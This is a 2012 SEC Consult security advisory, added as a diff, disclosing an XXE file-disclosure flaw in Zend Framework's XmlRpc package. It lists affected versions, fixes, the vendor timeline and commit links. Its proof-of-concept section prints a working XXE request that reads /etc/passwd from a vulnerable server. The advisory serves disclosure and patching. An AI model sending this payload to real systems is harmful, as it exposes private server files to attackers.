@@ -1,0 +1,187 @@
+SEC Consult Vulnerability Lab Security Advisory < 20120626-0 >
+=======================================================================
+              title: Local file disclosure via XXE injection
+            product: Zend Framework
+ vulnerable version: 1.11.11
+                     1.12.0 RC1
+                     2.0.0 beta4
+                     and earlier versions / branches
+      fixed version: 1.11.12
+                     1.12.0 RC2
+                     2.0.0 beta5 / trunk
+             impact: Critical
+           homepage: http://framework.zend.com/
+              found: 2012-06-18
+                 by: K. Gudinavicius 
+                     SEC Consult Vulnerability Lab 
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Extending the art & spirit of PHP, Zend Framework is based on simplicity,
+object-oriented best practices, corporate friendly licensing, and a rigorously
+tested agile codebase. Zend Framework is focused on building more secure,
+reliable, and modern Web 2.0 applications & web services, and consuming widely
+available APIs from leading vendors like Google, Amazon, Yahoo!, Flickr, as
+well as API providers and cataloguers like StrikeIron and ProgrammableWeb."
+
+Source: http://framework.zend.com/about/overview
+
+
+
+Vulnerability overview/description:
+-----------------------------------
+The XmlRpc package of Zend Framework is vulnerable to XML eXternal Entity
+Injection attacks (both server and client). The SimpleXMLElement class
+(SimpleXML PHP extension) is used in an insecure way to parse XML data.
+External entities can be specified by adding a specific DOCTYPE element to
+XML-RPC requests. By exploiting this vulnerability an application may be
+coerced to open arbitrary files and/or TCP connections.
+
+
+Other software that uses the XmlRpc package of Zend Framework is then also
+vulnerable to XML eXternal Entity Injection attacks!
+
+
+Proof of concept:
+-----------------
+For example, the loadXml function (Zend\XmlRpc\Request.php and Response.php)
+fails to disable external entities when parsing XML data. There is no call to
+the libxml_disable_entity_loader function before initializing the
+SimpleXMLElement class. Related code excerpt:
+
+    public function loadXml($request)
+    {
+        if (!is_string($request)) {
+            $this->_fault = new Zend_XmlRpc_Fault(635);
+            $this->_fault->setEncoding($this->getEncoding());
+            return false;
+        }
+
+        try {
+            $xml = new SimpleXMLElement($request);
+        } catch (Exception $e) {
+            // Not valid XML
+            $this->_fault = new Zend_XmlRpc_Fault(631);
+            $this->_fault->setEncoding($this->getEncoding());
+            return false;
+        }
+  
+  [...]
+
+  }
+
+If a web application uses the Zend_XmlRpc_Server() class
+(Zend\XmlRpc\Server.php) to handle XML-RPC requests, it is possible to
+disclose arbitrary local files from the remote system. The following HTTP POST
+request to the vulnerable XmlRpc server application illustrates the
+exploitation of this vulnerability.
+
+POST /xmlrpc_server.php HTTP/1.1
+Host: $host
+
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+  <!ELEMENT methodName ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<methodCall>
+  <methodName>&xxe;</methodName>
+</methodCall>
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerability has been verified to exist in versions 1.11.11 and 
+2.0.0beta4 of Zend Framework, which were the most recent versions at 
+the time of discovery.
+
+Furthermore, previous versions and 1.12.0 RC1 are also affected.
+
+Older branches are also affected but won't be fixed by Zend as they are not
+maintained anymore. Their policy is to fix the current minor release
+and the immediate previous minor release.
+
+
+Vendor contact timeline:
+------------------------
+2012-06-18: Contacting vendor through zf-security@zend.com
+2012-06-18: Vendor: Very fast reply, fixes issue already after 3 hours!
+2012-06-18: Confirming server-side fix, adding recommendation for XmlRpc
+            client code
+2012-06-19: Vendor: XmlRpc client code also fixed
+            Confirming fix
+2012-06-20: Contacting local CERT
+2012-06-20: Vendor: starts packaging, expected release of 1.11.12 and
+            1.12.0RC2 by end of week, ZF2 trunk already fixed, next beta
+            2.0.0beta5 will be released late next week
+2012-06-22: Vendor: Packages are created and staged, packages and security
+            announcement will be released on Monday
+2012-06-25: New packages and Zend security advisory released by vendor
+2012-06-26: SEC Consult releases security advisory
+
+
+
+Solution:
+---------
+Upgrade to the latest version available, e.g.
+* v1.11.12
+* v1.12.0 RC2
+* update ZF2 master trunk
+
+If you are using an older branch you are urged to upgrade!
+
+Zend framework security advisory:
+http://framework.zend.com/security/advisory/ZF2012-01
+
+Download link for new releases:
+http://framework.zend.com/download/latest
+
+
+Commits:
+--------
+http://framework.zend.com/code/log.php?repname=Zend+Framework&path=%2F
+
+* Zend Framework 1.X
+  Trunk:
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Ftrunk&rev=24970&peg=24970
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24975
+
+* 1.11.X:
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24971&peg=24971
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24972&peg=24972
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24976
+
+* 1.12.0: 
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2Fbranches%2F&rev=24973&peg=24973
+  http://framework.zend.com/code/revision.php?repname=Zend+Framework&path=%2F&rev=24977
+
+* Zend Framework 2.0
+  https://github.com/zendframework/zf2/pull/1523
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/advisories.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+https://www.sec-consult.com
+
+EOF K. Gudinavicius, J. Greil / @2012
